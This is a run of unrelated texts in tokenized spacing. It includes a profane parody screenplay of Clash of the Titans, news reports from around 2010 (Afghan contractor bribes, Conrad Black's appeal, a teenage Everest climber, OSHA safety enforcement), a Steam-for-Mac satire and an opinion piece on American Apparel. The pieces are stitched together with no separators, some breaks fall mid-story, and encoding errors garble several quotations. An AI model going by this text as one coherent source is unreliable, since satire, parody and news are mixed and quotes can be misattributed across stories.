Whoa , whoa , whoa , hold the fuck on .
Medusa was a woman who turned down the sexual advances of a god , who then raped her , which caused another god to put a curse on her that turns anyone to stone when they look at her .
Now we 're going to track down this poor woman who did nothing wrong and just wants to be left alone , then cut off her fucking head to use it as a weapon ?
There were like fifty writers on this screenplay and nobody realized the main characters are total wangholes ?
SAM WORTHINGTON
Boooooo - ring !
Is it time for an action scene yet ?
Like maybe I could ride a three - headed lobster or something .
SAM and his POSSE confront MEDUSA .
EVERYONE gets turned to STONE except the DJINN , who uses himself as a bomb to cripple MEDUSA long enough for SAM to cut her head off .
SAM WORTHINGTON
Let 's all try to ignore the fact that the only character in this movie inspired by Arabian rather than Greco - Roman mythology just became the film 's only suicide bomber .
GEMMA ARTERTON is killed by TWO - FACE IN A SKIRT , who SAM kills .
SAM rides a PEGASUS back to ARGOS to kill the KRAKEN .
It 's all very PERCY JACKSON but SUPER - DUPER - SERIOUS .

A HARPY steals the MEDUSA HEAD from SAM and flies all around .
SAM WORTHINGTON
I really hope I can get that back before the harpy realizes that he can pretty much end the movie by tossing that thing in the sea or the Kraken 's mouth ...
He DOES .
He uses the HEAD to freeze the KRAKEN .
RALPH FIENNES
Damn !
And to think , my entire plan would have worked flawlessly if I simply had n't needlessly murdered your family as they were randomly passing by !

LIAM NEESON comes down to talk to SAM .
LIAM NEESON
You 've done a great job defeating the monster that I allowed out to destroy you .
I 'm proud of you , son .
SAM WORTHINGTON
Are we just going to forget you raped my mother ?
We 're cool now , is that it ?
LIAM NEESON
As a gift , I 've brought Gemma Arterton back to life .
SAM WORTHINGTON
Why not just bring back my fucking family , you complete asshole ?
LIAM NEESON
You 're welcome , son .

KING VENCENT REGAN
We did it , Sam !
My soldiers were easily dispatched by a variety of monsters , but we were able to overcome them with the help of two demi-gods and a magical sword handed down by our creator !
Damn the gods , who needs 'em !
SAM WORTHINGTON
Humans are kind of schmucks , huh ?
You sure you guys are ready to abandon religion ?

Click for New York Times story : US - backed ‘ bribes ’ in Afghanistan may be funding Taliban
On June 7 , the day Afghanistan became AmericaÃ¢â‚¬â „ ¢s longest - ever war , the New York Times reported on an ongoing investigation poised to prove that private security companies “ are using American money to bribe the Taliban ” to fuel combat and thus enhance demand for their services .
The news follows a “ series of events last month that suggested all - out collusion with the insurgents , ” the Times said .
ADVERTISEMENT
Rep. Dennis Kucinich ( D - OH ) , a leading opponent of the war , wondered , “ Is the U.S. paying for attacks on U.S. troops ?
Ã¢â‚¬Â
“ Our troops are dying in Afghanistan , and now it turns out we may be funding their killers , ” Kucinich said in a statement e-mailed to Raw Story , renewing his longstanding call for a pullout .
“ Our continued presence in Afghanistan is detrimental to our security . ”
“ The American people are paying to prop up a corrupt government that may be using our money to pay private companies to drum up business by paying the insurgents to attack our troops , ” he said .
KucinichÃ¢â‚¬â „ ¢s motion in March to implement a swift withdrawal of US troops from the region failed by a margin of 365 - 65 in the House .
“ In the coming weeks , Congress is expected to be asked to give another $ 33 billion for war efforts …
I will be bringing this report to the personal attention of individual Members of Congress prior to the vote on any additional war funding , ” the Ohio congressman said .

The Times interviewed a NATO official in Kabul who “ believed millions of dollars were making their way to the Taliban . ”
A White House spokesperson did not return a request for comment .
Robert Greenwald , an ardent war critic and director of the 2009 documentary “ Rethink Afghanistan , ” viewed the Times story as vindication for his message .
ADVERTISEMENT
Ã¢â‚ ¬Å“ Supporting a corrupt elite in a civil war does nothing to make us safer , costs the United States billions of dollars , and itÃ¢â‚¬â „ ¢s not working , Ã¢â‚ ¬Â Greenwald told Raw Story .
It “ confirms what we have heard numerous times from our friends , co workers and producers in Afghanistan .
The United States is effectively funding both sides of the war all too often , ” he said .
ADVERTISEMENT
The administration and large bipartisan majorities in Congress continue to support and fund 8 - year - long military operations in Afghanistan , warning that a pullout could lead to a Taliban takeover and greater threats to American interests .
Richard Holbrooke , US special envoy to Afghanistan and Pakistan , told reporters Monday that the US , Japan , Britain and other countries have Ã¢â‚ ¬ Å“ committedÃ¢â‚ ¬
Â roughly Ã¢â‚ ¬ Å“ 200 million dollarsÃ¢â‚ ¬Â to fund peace efforts in Afghanistan , Agence - France Presse reports .
The Afghanistan Peace and Reconciliation Program aims to reintegrate Taliban fighters who have renounced violence into Afghan society .
Who said Labour has lost its sense of humour ?
The party has produced this witty personalised video lampooning David Cameron 's " big society " in which people will be invited to join the government of Britain .
Labour believes the big society is a PR makeover of an old Tory idea to shrink the state .
It says that Burke 's " little platoons " were all very well in the 18th century when high - minded charitable groups helped relieve poverty .
But Labour says they are wholly inappropriate in the 21st century when only state action can tackle inequalities .
The video is set in the future , when the big society is well under way .
It opens with a harassed mother , dressed as a lollipop lady , walking into the kitchen .
As her kids shout out that they 're tired – her daughter 's been tarmacking the road – she answers the telephone as the police and the parole board .
Finally she takes a 999 call .
The funniest bit is when the mother asks the viewer whether they 'd like to buy a raffle ticket :
It 's for the GPs ' wages in two weeks time .
We were fine for next week because we had a sponsored silence which was n't easy because it was my turn interviewing claimants at the dole office .
The video is being sent out to thousands of people .
An early recipient was Benedict Brogan , the blogging deputy editor of the Daily Telegraph .
If you receive a copy your name will appear on post - it notes during the video .
In the end your name appears as the mother telephones you to ask why you did n't vote Labour on 6 May .
Douglas Alexander , Labour 's general election coordinator , said :
The video is a light - hearted way of making a serious point – that in truth the Tories ' big society is nothing more than abandoning public services .
The Tories plan for DIY public services mean no guarantees for patients , parents or communities .
The Tories are laughing off the video .
But the big society is a sensitive issue for them .
A series of senior Tories told me last month that it was crashing on the doorstep .
One shadow minister told me :
The big society needs to be turned into more practical , voter - friendly language .
We need to turn Oliver Letwin 's Hegelian dialectic into voter friendly stuff .
Michael Gove , the shadow schools secretary who is one of the brains behind the big society , showed the leadership 's sensitivity on this on BBC Radio 4's Today programme this morning .
Under questioning from Evan Davis about what is meant by the big society , he said :
It 's often the case that the metropolitan media classes tend to be dismissive of the extent to which people across the country are unhappy with public services and want a government that 's prepared to listen ...
The big society is about citizens making sure local services are more responsive to them .
Gove will probably be sent one of the videos .
The high - minded Oxford scholar will not be amused .
I just want to cry after reading Paul Krill 's report on a venture capitalist forum at San Francisco 's esteemed Churchill Club , whose discussions often make it to public radio nationwide .
The VCs are still gaga over social networking , an industry that has n't yet figured out how to make money , which allegedly is what VCs are good at .
They 're also into Websites and health technology -- two duhs .
But I 'm not surprised .
VCs have built a mythology around themselves as technology visionaries .
Very few are .
Most are mules in a pack , going after the same fodder as everyone else .
If VC firm A invests in an online pet food store , so do VC firms B through Z , so you get 26 online pet food stores -- or today , 26 virtual goods firms .
Lest we forget , it was this VC mentality that led to the dotcom boom and its devastating crash .
It 's an open secret in Silicon Valley that VC firms are bad at making money .
In fact , they keep getting worse and worse returns , so a focus by VCs on social networking , " real time " Web , and health initiatives tells me those are passé , obvious , or both .
VCs ' prognostications should be taken with a big grain of salt .
What the conference did identify was that to make the vision on constant interaction online with other people and with Websites -- which is really what they envisioned -- there needs to be a software stack and an information architecture in place that does n't exist today .
Maybe the VCs ' investment firms will figure that out , though the high focus on their own concerns makes such broad thinking unlikely .
But since VCs talk to each other constantly , maybe they can realize there 's a broad need that would help all their investments succeed , if only they treated it as an enabling technology they need to jointly develop .
That may be hard to justify , given their business models of investing in startups , having those startups buy the services from their previous startups , and then flipping the startups to investors -- but it could create a fabulous return on a whole raft of investments , not just the lucky one who that offers its IPO or gets acquired first .

STOCKHOLM — Workers at Swedish docks launched a week - long boycott of Israeli ships and cargo on Wednesday , to protest Israel 's recent raid on a Gaza - bound flotilla Some 1,500 members of the Swedish Port Workers Union began the boycott at Sweden 's ports which handle up to 95 percent of the country 's foreign trade .
The action is planned to end on June 29 .
" Even if goods arrive in trucks , dockworkers often have some role in handling them when they arrive in port , " said Per Helgesson , attorney and chief negotiator at Ports of Sweden — an industry and employers ' organization for the sector .
The union supported the international aid convoy and demands that Israel lift its blockade on Gaza .
Several Swedish activists were on the flotilla when Israeli commandos attacked it on May 31 .
Israel recently eased the 3 - year - old blockade under international pressure , but union spokesman Bjorn Borg said the measure was insufficient .
"
We do n't think it is far - reaching enough , " Borg said .
" We want them to lift the blockade .
" Borg said stevedores in the southwestern port of Goteborg had already refused to handle about a dozen containers containing cargo from Israel or goods destined for it .
Officials said they expected the boycott to have a minimal impact on Swedish - Israeli trade , which accounts for 0.2 percent of the Nordic country 's total imports and exports .
Last year , Swedish exports to Israel were valued at 2.5 billion kronor ( $ 320 million ) and imports amounted to some 850 million kronor , according to the Swedish Trade Council .

SOLON , Ohio -- Bainbridge Road residents lost a court fight Friday to try to block their yard from being paved over for a temporary road .
Cuyahoga County's $ 12 million plan to reconstruct 2.4 miles of Bainbridge Road and add new sidewalks , water lines and sewers is scheduled to start Monday .
The plan calls for taking parts of front lawns along the route to build a two - way temporary road to maintain traffic during construction , which is expected to last until the summer of 2012 .
Homeowners John and Mary McNamara asked Common Pleas Court on March 25 to block eminent domain action against them and prevent the temporary road .
But Judge Ronald Suster on Friday denied their request .
Suster did not issue a written opinion but said Friday the McNamara 's had not proven their case well enough to block the long - planned project .
Assistant County Prosecutor Dale Pelsozy , who represented the county , said the temporary road is necessary and that the McNamaras should have filed their objection last summer instead of at the last minute .
Mary McNamara and lawyer Alyssa Keeny said they expected to schedule a hearing Friday and were caught off guard by Suster ruling before the McNamaras or experts could testify .
Suster said he ruled quickly because construction is scheduled to start next week .
Though the McNamaras were the plaintiffs in the case , other neighbors also oppose the plan .
They and their attorneys said they do not object to the entire project or to losing property to permanently improve the road , just having two lanes of traffic run through their yards for the temporary road .
The county has filed to take the land through eminent domain and will return it after construction is over .
The residents say that while the land will be taken temporarily , trees and other features -- including a stone wall at one home -- will be destroyed .
They said using detours or one - way traffic would reduce damage to their property .
" There is no necessity for the temporary road , " Mary McNamara told The Plain Dealer before the judge 's ruling .
" It 's merely a matter of convenience .
Taking of personal property was n't meant for convenience . "
Neighbor John Nolan said creating a two - lane temporary road is both unusual and overkill .
" If the road was getting widened , you could see it , " said Nolan , who will lose a stand of mature arborvitae .
" But you 're doing permanent destruction for temporary convenience .
It 's unnecessary . "
The Solon police and fire departments have said that other options would not work and that the two - way temporary road , which will cost $ 1.1 million , is best for public safety .
The McNamaras argued that the county did not follow the proper procedure in trying to acquire the land from homeowners and misrepresented the plan .
Attorney Warner Mendenhall , who also represented the McNamaras , said residents were told the land was needed for grading .
" They never told the property owners they were going to put a two - lane road in their front yard , " he said .
The project , which has been planned since 1993 , moved to the forefront when federal stimulus money became available .
That money will pay for the entire project .
The disgraced former Telegraph owner Conrad Black and the Enron fraudster Jeffrey Skilling have won fresh hope of early release from jail following a US supreme court ruling that their convictions partly relied on a controversial corruption law that was too broad in its scope .
In a major legal victory for the two jailed tycoons , America 's top court issued separate , but related , rulings declaring that the men were treated unfairly when appeal court judges threw out their attempts to overturn their convictions .
However , the rulings shed doubt only on certain aspects of the men's multiple convictions and stop well short of acquittal .
Black , currently an inmate at Florida 's Coleman prison , was sentenced in 2007 to six and a half years for defrauding shareholders in his Hollinger media empire out of $ 6.1 m ( £ 3.7 m ) by attaching a " non-compete " clauses to the sale of newspaper businesses that siphoned off funds from investors .
The Canadian - born peer was stripped of the Conservative whip following his conviction .
He has vigorously protested his innocence from the beginning .
Skilling , 56 , is in a prison near Denver and is serving a 24 - year sentence .
He was chief executive of Enron until shortly before the energy trading company imploded in one of the most dramatic corporate corruption scandals in US history .
In both cases , prosecutors used a law that allows for conviction if business leaders are found to have robbed investors of " honest services " .
But twin decisions written by the supreme court judge Ruth Bader Ginsburg rule that this law should only be applied to incidents of bribery and kickback schemes .
Referring to Black , the ruling concludes : " We vacate the judgment of the court of appeals and remand the case for further proceedings . "
The decision affects three counts of fraud for which Black was convicted by a Chicago jury .
But the 65 - year - old former press baron still faces a hurdle in that he was also found guilty of obstructing justice by removing boxes of evidence from his Toronto office in defiance of a court order .
Once friendly with society figures ranging from Margaret Thatcher to Henry Kissinger , Black described the case against him as hanging " like a toilet seat " around the necks of prosecutors .
His legal team have never been pleased to have their case lumped in with Skilling , even through they appealed almost simultaneously to the supreme court on the same legal grounds .
Skilling was convicted in 2006 on 19 counts of fraud , conspiracy , insider trading and lying to auditors .
His co-accused , the former Enron chairman Ken Lay , died of a heart attack while awaiting sentencing .
Ginsburg 's ruling , which is written on behalf of a majority of the supreme court 's nine judges , says her decision does not necessarily mean the Enron boss 's convictions should be overturned .
And she threw out a claim by Skilling that his trial was unfair because it was held in Houston , a city scarred by the energy trading company 's demise .

Sporting a reproductive " skyline , " a new species of jellyfish is like nothing else known under the sea , a new study says .
Shaped like flying saucers , both males and females of the new jellyfish have gonads on the outsides of their bodies , unlike any of the approximately 3,000 other jellyfish species known to science­ .
Gonads are the reproductive glands that produce sperm in males and eggs in females .
Arranged in a " crater " at the center of the jellyfish 's top side , the gonads , upon close inspection , resemble " skyscrapers in a downtown business district , " said Lisa - Ann Gershwin , curator of zoology at the Queen Victoria Museum and Art Gallery in Launceston , Australia .
Accordingly , Gershwin gave the jellyfish the species name " medeopolis , " Latin for " city of gonads . "
" It 's just so completely different from anything we 've ever seen before , " Gershwin said — in fact , the jellyfish has forced the creation of a whole new family and genus , Csiromedusidae and Csiromedusa , respectively .
Both names honor the Australian government 's Commonwealth Scientific and Industrial Research Organization ( CSIRO ) , which assisted the scientists with their research .
" City of Gonads " Stumps Scientist
Gershwin and colleagues discovered the city - of - gonads jellyfish eight years ago in a part - seawater river in the city of Hobart ( map ) on the Australian island of Tasmania .
It took until now , though , for the scientists to verify that Csiromedusa medeopolis represents a new family .
Harmless to humans , the new jellyfish species measures just 1.5 to 2 millimeters ( 0.06 to 0.08 inch ) across — " not the smallest ever known , but it would be pretty close , " Gershwin said .
About 90 percent of jellyfish species are smaller than an inch ( 2.5 centimeters ) , but fewer than 0.5 percent of jellyfish are measured in millimeters .
Making the Csiromedusa medeopolis discovery was " like a day at Disneyland for a scientist , " said Gershwin , who 's named more than 160 new jellyfish species , including a " rainbow glow " jelly ( picture ) .
Despite all that experience , she 's at a loss to explain what good external gonads would be for a jellyfish .
" I 've thought about this for so long — I have no idea , " Gershwin said .
" There may be some functional reason , but I can't see what it is . "
The city - of - gonads jellyfish study is published online this week in the journal Zootaxa .

News staff at Cyprus ’s state broadcaster briefly walked off the job on Monday over conditions which included smelly studios and an infestation of fleas , workers said .
“ We demand a decent and safe place to work , ” a staff member told Reuters , speaking on condition of anonymity .
Management are trying to find suitable work spaces for staff .
Management were not immediately available for comment , but had said last week that they were working on improving job conditions .

There were several incidents of members of staff falling ill after pest controllers were called to the premises last week , staff said .
Somewhere in L.A. American Apparel CEO , Dov Charney , tosses his head back .

American Apparel is built on the appeal of the risque .
Controversy .
Every neon thong leotard and gold lame jumpsuit is meant to provoke .
To offend " mainstream " sensibilities .
To attract a consumer that desires to ( in some tame way ) walk on the wild side by proxy .
Charney is a disgusting little man and he loves it .
He wants it that way .
Keeping this important fact in mind , let 's take a closer look at their new more sophisticated , expensive and classy " New Standard " style direction .
To quote an email sent by AA management regarding grooming standards and reported by Gawker last week :
American Apparel 's Complete Guide to Grooming Last week , we learned that sextastic clothing line American Apparel hires and fires employees based Read more

Please keep in mind that American Apparel is a retailer that celebrates natural beauty .
We encourage employees to feel comfortable in their natural skin and natural state .
This aesthetic is a part of the company image ; as we do not photoshop our advertisements and our models appear in their natural state ... Makeup is to be kept to a minimal ... Eyebrows must not be overplucked ..
At first glance , it is a seemingly refreshing code .
Seemingly in support of the natural beauty of women .
Seemingly a wonderful alternative to the glossy and overly airbrushed fashion ads we are accustomed to .
Seemingly empowering .
But do not be fooled .
After all , this is Dov dubious - history - of - sexual - harassment - charges Charney we 're talking about .
First , it must be mentioned that if this is in fact a move in support of the natural beauty of women , it is the " natural " white female that is celebrated .
There is a glaring lack of diversity on the company 's site and in ads .
Sure , sure , there are a few sprinklings of brown about , but more often than not the representations are quite fair and with " that good hair . "
Many of the girls look multiracial and while I am fully in support of this ( as a multiracial woman myself ) , there is a definite avoidance in AA ads of anything that can be solidly identified as plain ol ' Black .
The lighter the skin , the nicer the hair - the better .
As an AA manager was told in regards to hiring at casting calls :

If this does n't already make you want to throw away your Fine Ribbed Jersey Tri-blend Interlock Nylon Scoop Neck Pencil dress , read on .
This new direction in reality has nothing to do with the power of a woman 's natural beauty .
Not even white women .
It is simply a continuation of woman as 100 % sexual object .
Only now without makeup .
And this is significant .

Fashion should embrace " bare faced " women .
Not because they are any more powerful or liberated or attractive than a woman in makeup , but because they are n't any less so .
A woman in her so - called natural state is a beautiful thing , but through the hypersexual and exploitative gaze of AA , it becomes something else entirely .
It is a clever way of emphasizing youth , vulnerability and a hint of unwilling exposure .
Advertisement
An American Apparel image of a barely legal woman without makeup , coquettishly offering up her ass , is not evidence that AA supports a woman 's " natural " charms .
Sure , the company " encourages their employees to feel comfortable in their natural skin and natural state " but the image they portray in fact has little to do with beauty , and everything to do power .
It is the sexual appeal of a young and vulnerable woman disguised as a celebration of organic beauty .
The use of cosmetics , and the grooming of eyebrows are an indication of a certain maturity among American women .
Perhaps it should n't be this way , but thirteen - year - old girls will still reach for the tweezers and lipstick in attempt to woo that stud of a 17 - year - old boy and demonstrate their sophistication .
We associate arched eyebrows and makeup with womanhood .
These are also efforts a woman makes in order to look and feel more attractive and comfortable with her appearance .
For many women , makeup is power .
It is in a way a kind of armor , donned before interacting with others .
Its use may be read as a signal that a woman is prepared to be seen .
She is a participant in receiving the public gaze .

Consider an AA ad featuring a very young woman with her legs spread extra wide for the camera .
Let 's say she is wearing lipstick .
In the context of this ad , this detail sends us a signal : She , in some tiny way , plays a role in her sexualization .
Good or bad .
Misguided or not , she gives some evidence of power .
She has made a decision : to put on lipstick .
Consider the same sexually raw ad this time without the makeup .
A small seemingly insignificant detail , but one that in the context of a highly sexual fashion spread ( pun intended ) speaks volumes .
She has no defenses .
Her armor has been removed ( and in fact expressly forbidden ) .
She is as young , bare , unexperienced , and malleable as legally possible .
A naked and unaltered page in high waisted lace shorts .
All the better for Dov Charney to get off on .

Following a
Ynet report on the Tel Aviv Municipality 's refusal to allow a rally for the legalization of marijuana , the city on Sunday announced that after reexamining the situation , it has decided that there are no grounds to forbid the rally , pending police approval .
Earlier Sunday , Ynet reported that the Tel Aviv Municipality was placing hurdles for Liora Gelber , who hoped to organize a rally in Rabin Square .
Tel Aviv Municipality official Ruby Zelof sent her a letter saying , " I hereby inform you that your request to hold a rally for the legalization of cannabis has been rejected . "
According to Gelber , " The police did not give us any trouble , but the municipality said it would cost us NIS 16,600 ( about $ 4,300 ) to hold the rally at Rabin Square , " said Gelber .
" We began to raise the money , and various artists confirmed their participation .
The notice we received today infuriated us .
The municipality did not even give us a reason for why it is not authorizing the rally . "
" We live in a democratic country and we have the right to protest , " she said .
In response to a Ynet appeal , the municipality said , " All mass events in public places in the city of Tel Aviv - Yafo require permits from the city and the police .
The matter was reexamined by the city 's legal advisor , who ruled that there are no grounds to forbid the gathering / protest aimed at changing the existing law on the use of cannabis . "
" When making the game is more important than selling it , then you know you 're actually creating an indie game .

Making a career out of art is never an easy or straightforward task .
For the growing movement of " indie " game developers , balancing creative experimentation with financial obligations is an all too common problem .
In the end , each developer 's attitude concerning the question of art versus commerce is as unique and varied as their games they create .
Of course , none of the conundrums faced by indie developers would exist without the proliferation of digital distribution services in the last few years , which has resulted in a huge and positive impact on sales for indie games .
Steampunk puzzle game Cogs from Lazy 8 Studios launched on Valve 's Steam download service in April , and Lazy 8 CEO Rob Jagnow states the game has sold around 2,200 copies in the last two months .
Those sales have netted Jagnow 's two - person operation about $ 15,400 after Valve 's 30 - percent cut of the profits .
If ( and it 's a big " if " ) sales hold steady at 1,000 per month , Cogs could sell 12,000 copies in a year and earn Lazy 8 Studios around $ 84,000 .
According to Jagnow , that kind of income simply would n't be possible with the old retail model available to indie game developers .
" I 've had publishers who wanted retail rights for Cogs tell me that I 'd be lucky to get 50 cents from a $ 10 sale , " he says .
Retail publishers claim that store shelves act as advertisements and also reach an audience uncomfortable buying digital products , but for Jagnow , " the basic math is simple :
If you think that for every 14 in - store purchases , one of those customers would be instead willing to buy online , then you 're better off skipping the retail sales . "
There 's no doubt this growth in indie game sales has been encouraged by the special attention digital distribution services now pay to indie games .
Steam has a separate " indie " section of 83 games ( out of the entire service 's 735 ) with most prices ranging between $ 4.99 and $ 19.99 .
Perhaps inspired by its own roots as an independent developer , Valve has been proactive in adding indie games to Steam , signing finalists from the Independent Games Festival including 2009 's Seumas McNally Grand Prize winner Blueberry Garden , which was recently featured on Steam 's main page .
Steam competitor Direct2 Drive is the official download sponsor of the IGF and offers a selection of 93 indie titles on its site .
Sweden - based Paradox Entertainment 's GamersGate sponsors the Swedish Indie Game Awards and lists its 11 indie games as a subsection of its " Casual " category .
Developers told
The Escapist these services offer comparable pricing and profit - sharing , plus the freedom to distribute their games on multiple services .
The explosion of indie games in the last few years - and the attention they 're receiving from both the media and distributors - can be interpreted as proof that a market exists for new , innovative titles .
Jonathan Mercier of Citérémis , whose Aztek - inspired RPG Aztaka launched in May , encapsulates those feelings : " The decisions made by the bigger companies have left a space for innovation and fresh ideas to blossom .
As long as players are interested in new and innovative games , ' indie ' or even the more forward - thinking of the large studios will have an audience and a chance to profit . "
WHY ?!?!?!?!?!?!?!?
Ok I ’ll admit it was a funny intro… just no more Ke$ha please … would be much better off if the entire cast of Simpsons sang ‘ All The Single Ladies ’ by Beyonce .

A 13 - year - old American boy on Saturday became the youngest person to conquer Mount Everest , his website said , setting a new but controversial world record .
Jordan Romero was one of more than 50 mountaineers who reached the top of the world ’s highest peak early Saturday , among them Apa Sherpa , who broke his own world record by summiting for the 20th time .
ADVERTISEMENT
The 13 - year - old from Big Bear , California was “ unbelievably happy ” when he called in from the summit via satellite phone , said a statement on his website , www.jordanromero.com.
“ The team just called in and confirmed that they are standing on top of Mount Everest — the highest peak in the world .
Their dreams have now come true , ” it said .
“ Everyone sounded unbelievably happy .
They also thanked everyone who supported them and encouraged them throughout their journey . ”
Jordan is three years younger than the previous record holder , believed to be Temba Tsheri of Nepal who reached the peak at age 16 .
The Californian ’s successful climb brought him a step closer to achieving his ultimate goal — set when he saw a mural at school aged just nine — of becoming the youngest person to climb the highest peaks on all seven continents .
He now has only the Vinson Massif in Antarctica to climb .
ADVERTISEMENT
Scores of supporters posted congratulations on his website , but the expedition has also attracted criticism from mountaineers , some of whom said Jordan was too young to undertake such a dangerous climb .
Hundreds of people have died trying to climb Mount Everest , many succumbing to altitude sickness or accidents , and the route that Jordan and his father and stepmother took is notorious for avalanches and high winds .
Authorities in Nepal do not grant climbing licences for Everest to anyone under the age of 16 and the Romeros chose to climb from the Tibet side which Jordan ’s father , a paramedic , said he judged to be less dangerous .
ADVERTISEMENT
Thousands of people have climbed Mount Everest since Edmund Hillary and Tenzing Norgay became the first people to conquer the 8,848 - metre ( 29,028 - foot ) mountain in 1953 .
Apa Sherpa , 50 , has done so more times than anyone else , and has been dubbed the “ super Sherpa ” for the apparent ease with which he scales the mountain , rarely even training for the climb .
ADVERTISEMENT
He had hoped to carry Hillary ’s ashes to the top on his latest expedition , but was warned against doing so by local priests , who worship the mountain as sacred and said it would bring bad luck .
Apa dedicated his 2010 expedition to the impact of climate change on the Himalayas , and led a team of climbers who plan to bring several tonnes of rubbish off the mountain .
“ I am thankful to have been able to climb Mount Everest for the 20th time , ” he said in a statement published on his website , www.apasherpa.net.
ADVERTISEMENT
“ I also climbed to bring attention to the damage done to the Himalayas because of global climate change . ”
Apa has his own charitable foundation , and spends much of his time in the United States raising funds to improve education and economic development in his native Nepal .
The summit season on Everest begins in late April and May when a small window between spring and the summer monsoon offers the best conditions for making the ascent .
The mountain lies on the border between China and Nepal , and mountaineering authorities said more than 50 people climbed from the Nepal side on Saturday , taking advantage of a lull in the wind .
ADVERTISEMENT
Among them was 16 - year - old Arjun Vajpai , who became the youngest Indian to reach the summit .
“ The weather was good today and so we saw a high number , ” mountaineering department spokesman Tilak Ram Pandey told AFP by telephone from Everest base camp .
“ It will last for the next two days and we are expecting to see more people climb tomorrow . ”
With the Steam for Mac digital distribution platform reaching beta and scheduled for a May 12 release , Mac gamers with a love of Valve games are looking forward to finally freeing themselves from the tyranny of dual - booting .
No longer will they have to taint their eyes and mousing hands by clicking on Windows icons .
They will finally be able to clear out that extra partition , preferably with napalm and sarin .
However , it could be argued that there 's such a thing as too much cross-compatibility .
Is it really fair to Apple fans to give them the exact same experience as Windows gamers , when they 're used to a different sort of treatment ?
I have heard rumors that the release versions of Valve 's ports for Mac will include some subtle but important changes to make sure users of Apple computers do n't keel over from fatal levels of unfamiliarity .
To wit :
Team Fortress 2 — — — ——
When engineers build turrets in the Mac version of Team Fortress 2 , the turrets will cost twice as much ( in metal ) as the Windows equivalent .
However , the turrets will be curvy and shiny , and emit a pleasant noise as they shoot the enemy down .
The Heavy 's chain gun will be lighter and smaller , and of course curvier and shinier .
It will weigh merely 1.8 pounds and fold up nicely to ultra - thin dimensions , allowing the Heavy to move quickly at all times .
It will keep track of the Heavy 's appointments and phone numbers with a stylish , yet elegantly functional , interface .
However , it will only shoot rubber bullets .
Half - Life 2 — — —
–
In Half - Life 2 , instead of picking ammo off the filthy ground like a common Windows user , you must go to an immaculate white Ammo Store where twentysomethings with fauxhawks will sell you immaculate white bullets , provided you have n't been murdered by an immaculate white Manhack .
You will be able to defeat zombies by spreading rumors that Apple is coming out with a new color of iPod Nano , at which point they all run off to reload Engadget over and over .
Portal ——
Portal 's disembodied AI overseer GLaDOS will be replaced with a voiceover of Steve Jobs , who will explain that your portal gun only makes entrances , not exits .
He explains that the exit functionality is not necessary to enjoy the game , but nonetheless he will be releasing a new version that can make both types of portals in three to six months .
If you figure out an unusual way to get through a level , you will be dropped back into the same level until you get through it in the officially approved manner .
This is necessary in order to provide a uniform user experience .
Left 4 Dead — ——
–
All custom maps in the Mac version of Left 4 Dead will have to be approved by Apple , which will reject any maps that feature nudity , suggestive content , political satire or zombies .
Two more main characters will be added : a balding , schlubby - looking guy in a suit , and a young dude with tousled hair and a semi - beard whom you will immediately want to shoot .
However , you should not shoot the tousled guy , because teamwork is important to winning the game – and because it 's a lot more satisfying to see him dragged to his death by a tongue zombie .

PITTSBURGH ( PAI ) – The Occupational Safety and Health Administration “ will use not just our normal inspection system , but regulation by shaming ” against notorious job safety and health violators , its administrator says .
In a June 15 telephone press conference / emergency meeting in Pittsburgh on the issue with Steelworkers President Leo Gerard and Mine Workers President Cecil Roberts , OSHA Administrator Dr. David Michaels added that the targets of the shaming would be “ those companies that are n’t playing by the rules ” on worker safety and health .
“ We have every right to call the CEO of any company and tell them what we want , and we will , ” Michaels added .
And he urged workers to report violations .
Gerard , Roberts and Michaels spoke at an emergency safety conference of oil workers the Steelworkers union called in Pittsburgh , after a string of fatal oil refinery accidents – even before the deep - sea BP well blew up – and after deaths of 37 coal miners so far this year .
Michaels said he has already called the oil companies ’ lobby on the carpet to justify its practices , after the catastrophic Deepwater Horizon oil well fire , explosion and sinking in the Gulf of Mexico almost two months ago .
The blast at the mile - deep well killed 11 workers and has spewed millions of barrels of oil into the Gulf in the worst environmental disaster in U.S. history .
Oil and mine disasters show the need for stronger job safety laws , and stronger enforcement , both union leaders said .
“ There ’s got to be an equal consequence ” for companies when their laxity or refusal to protect workers costs lives , Gerard said .
Harkening back to the 1989 Pittston coal strike , where the United Mine Workers was fined $ 64 million for a peaceful protest that blocked a road , Roberts said “ what corporate CEOs go through ” when their firms kill people “ is vastly different ” than what hit his union .
“ Their fines are not adequate .
We need stronger laws , bigger penalties and criminal penalties for executives who commit these acts , ” Roberts added .
Both unions are leading labor ’s fight for the Protect American Workers Act ( PAWA ) , a measure to strengthen the 40 - year - old Occupational Safety and Health Act .
It would increase fines , let OSHA impose separate fines for each violation , and change violations that kill workers from criminal misdemeanors that carry maximum six - month jail sentences to felonies that carry 10 - year and 15 - year terms , among other things .
The Obama administration OSHA , led by Michaels , also endorses PAWA , but the measure is marooned in Congress , victim of a jammed schedule .
Business and congressional Republicans also strongly oppose the legislation .
The oil majors also do n’t want to do anything about safety , citing money , says Steelworkers Vice President Gary Beevers , who is in charge of bargaining with the oil firms .
( The USW has represented the nation ’s oil workers since it merged with Paper , Allied - Industrial , Chemical and Energy Workers in 2005 .
His statements were backed up , the same day , by documents released by congressional committees investigating the Gulf of Mexico disaster .
They show BP , which buys the oil from Deepwater Horizon , stinted on safety .
But the documents also showed the other oil majors also have large safety problems and lack plans for them .
In the last round of oil company bargaining , following the fatal 2005 blast at BP ’s Texas City , Texas , refinery , the USW pushed strongly for including safety standards – notably process safety , covering entire refineries , not just specific machinery – in its contracts with the oil companies , Beevers said .
The firms turned that down flat .
Since then , he added , the oil majors remained intransigent .
The independent investigatory federal Chemical Safety Board identified huge safety violations at Texas City and declared the industry as a whole was negligent .
Beevers said the oil lobby then offered to share information , refinery by refinery – but only if the USW would “ sign a confidentiality agreement , ” confining the data to each specific refinery ’s workforce .
“ The one thing we know is that we have a fight at every refinery over money ” to be spent on safety and health , he added .
“ As Dr. Michaels said , it ’s not just BP .
OSHA ’s own survey showed 70 percent of the nation ’s refineries had the same conditions as at Texas City ” where a large leak produced fumes that were then ignited , killing 15 and injuring more than 100 .
Gerard reminded listeners that inattention to job safety and health costs lives .
He said one committee , chaired by Sen. Patty Murray , D - Wash . , has held hearings this year on the string of refinery blasts .
Murray acted after one blast in Tesoro , Wash . , near her home , killed six Steelworkers and a former unionist promoted to a supervisor ’s job .
“ Do n’t just have hearings about the oil leak in the Gulf .
Have hearings about the 11 families whose lives were destroyed .
You do n’t hear about them anymore , ” he said .

The U.S. Environmental Protection Agency ( EPA ) has struggled in the past two months to come to grips with dispersants , the chemical cocktails being used to break up the Gulf of Mexico oil spill into tiny droplets that are easier for microbes to eat .
